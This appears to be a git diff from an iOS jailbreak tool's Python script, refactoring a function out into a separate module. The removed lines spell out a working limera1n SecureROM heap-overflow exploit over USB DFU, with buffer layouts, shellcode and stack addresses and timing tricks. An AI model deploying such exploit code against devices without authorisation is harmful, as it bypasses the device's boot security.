@@ -1,4 +1,3 @@
-import struct
 import subprocess
 import time
 from pathlib import Path
@@ -6,104 +5,20 @@ from pathlib import Path
 import usb
 import usb.core
 
-from device import maybe_acquire_device, DeviceMode, acquire_device, acquire_device_with_timeout
+from device import DeviceMode, acquire_device, acquire_device_with_timeout
 from os_build import OsBuildEnum, ImageType
 from patcher import regenerate_patched_images, IpswPatcherConfig, generate_patched_ipsw
 from recompile_payloads import recompile_payloads
+from securerom import execute_securerom_payload
 from utils import run_and_check
 
 
-def recompile_exploit_runner(jailbreak_folder: Path):
-    subprocess.run(
-        [
-            "clang",
-            "main.m",
-            "-obuild/jailbreak",
-            "-I/opt/homebrew/Cellar/libusb/1.0.26/include",
-            "-L/opt/homebrew/Cellar/libusb/1.0.26/lib",
-            "-framework",
-            "Foundation",
-            "-lusb-1.0",
-        ],
-        shell=False,
-        cwd=jailbreak_folder
-    )
-
-
 def exploit_and_upload_image(image_path: Path):
-    with maybe_acquire_device(DeviceMode.DFU) as maybe_dfu_device:
-        if not maybe_dfu_device:
-            print('No DFU-mode device detected, will not run exploit or upload image')
-            return
-        device = maybe_dfu_device
-
-        print(f'Running exploit because we detected a DFU-mode device')
-
-        # Run limera1n
-        RECV_IMAGE_BUFFER_BASE = 0x84000000
-        RECV_IMAGE_BUFFER_SIZE = 0x2c000
-        FOUR_K_PAGE = 0x1000
-        DFU_MAX_PACKET_SIZE = 0x800
-        stack_addr = 0x8403BF9C
-        # Add 1 so the shellcode executes in Thumb
-        shellcode_addr = RECV_IMAGE_BUFFER_BASE + RECV_IMAGE_BUFFER_SIZE - FOUR_K_PAGE + 1
-        print(f'shellcode_addr {hex(shellcode_addr)}')
-
-        load_region_buf = bytearray([0 for _ in range(RECV_IMAGE_BUFFER_SIZE)])
-        load_region_buf[0:DFU_MAX_PACKET_SIZE] = [0xcc for _ in range(DFU_MAX_PACKET_SIZE)]
-        for i in range(0, DFU_MAX_PACKET_SIZE, 0x40):
-            struct.pack_into("<I", load_region_buf, i + 0, 0x405)
-            struct.pack_into("<I", load_region_buf, i + 4, 0x101)
-            struct.pack_into("<I", load_region_buf, i + 8, shellcode_addr)
-            struct.pack_into("<I", load_region_buf, i + 12, stack_addr)
-
-        # Send the heap fill
-        # (This one includes the jump addr)
-        print('Sending heap fill')
-        device._dfu_upload_data(load_region_buf[0:DFU_MAX_PACKET_SIZE])
-
-        # Fill the heap even more?!
-        print('Filling the heap some more')
-        load_region_buf[0:DFU_MAX_PACKET_SIZE] = [0xcc for _ in range(DFU_MAX_PACKET_SIZE)]
-        #dfu_packet_buf = bytearray([0xcc for _ in range(DFU_MAX_PACKET_SIZE)])
-        for i in range(0, RECV_IMAGE_BUFFER_SIZE - 0x1800, DFU_MAX_PACKET_SIZE):
-            device._dfu_upload_data(load_region_buf[0:DFU_MAX_PACKET_SIZE])
-
-        print('Sending shellcode')
+    with acquire_device(DeviceMode.DFU) as dfu_device:
         securerom_shellcode_path = Path(__file__).parent / "payload_stage1" / "build" / "payload_stage1_shellcode"
         securerom_shellcode = securerom_shellcode_path.read_bytes()
         print(f'SecureROM shellcode length: {len(securerom_shellcode)}')
-        device._dfu_upload_data(securerom_shellcode)
-
-        # This might be a heap fill?
-        dfu_packet_buf = bytearray([0xbb for _ in range(DFU_MAX_PACKET_SIZE)])
-        device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 1000)
-
-        print('Sending arbitrary data to force a timeout')
-        class ExpectedUsbTimeout(Exception):
-            pass
-        try:
-            device._dfu_upload_data(dfu_packet_buf, timeout_ms=10)
-            raise ExpectedUsbTimeout()
-        except usb.core.USBTimeoutError:
-            # Expected/desired here
-            pass
-
-        # This should fail too
-        try:
-            device.handle.ctrl_transfer(0x21, 2, 0, 0, dfu_packet_buf, 10)
-            raise ExpectedUsbTimeout()
-        except usb.core.USBTimeoutError:
-            # Expected/desired here
-            pass
-        print(f'Sent exploit to overflow heap')
-
-        # Reset the device and inform it there's a file ready to be processed
-        device.handle.reset()
-        device._dfu_notify_upload_finished()
-        with acquire_device(DeviceMode.DFU):
-            print('Device reconnected limera1n exploit successful')
-        usb.util.dispose_resources(device.handle)
+        execute_securerom_payload(dfu_device, securerom_shellcode)
 
     # Give the on-device payload a chance to run
     time.sleep(3)
